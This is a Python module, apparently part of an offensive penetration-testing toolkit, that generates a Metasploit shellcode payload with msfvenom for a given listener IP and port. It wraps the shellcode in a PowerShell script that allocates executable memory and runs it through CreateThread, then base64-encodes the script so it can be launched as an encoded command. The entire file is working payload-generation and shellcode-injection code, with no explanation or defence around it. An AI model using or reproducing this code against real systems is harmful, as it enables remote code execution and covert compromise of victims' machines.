#!/usr/bin/python
#
# paygen powershell module

import base64
import sys
import subprocess
import re
import os
import time
from src.core.main import *
from src.core import menus

def generatePS(payload, ip, port):
	proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s c" % (payload, ip, port), stdout=subprocess.PIPE, shell=True)
	data = proc.communicate()[0]
	
	data = data.replace(";", "")
	data = data.replace(" ", "")
	data = data.replace("+", "")
	data = data.replace('"', "")
	data = data.replace("\n", "")
	data = data.replace("buf=", "")
	data = data.rstrip()
	data = re.sub("\\\\x", "0x", data)
	
	counter = 0
	mesh = ""
	newdata = ""
	for line in data:
		mesh = mesh + line
		counter = counter + 1
		if counter == 4:
			newdata = newdata + mesh + ","
			mesh = ""
			counter = 0

	shellcode = newdata[:-1]
	powershell_command = ('''$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };''' % (shellcode))
	blank_command = ""

	for char in powershell_command:
		blank_command += char + "\x00"
	
	powershell_command = blank_command
	powershell_command = base64.b64encode(powershell_command)
	
	return powershell_command
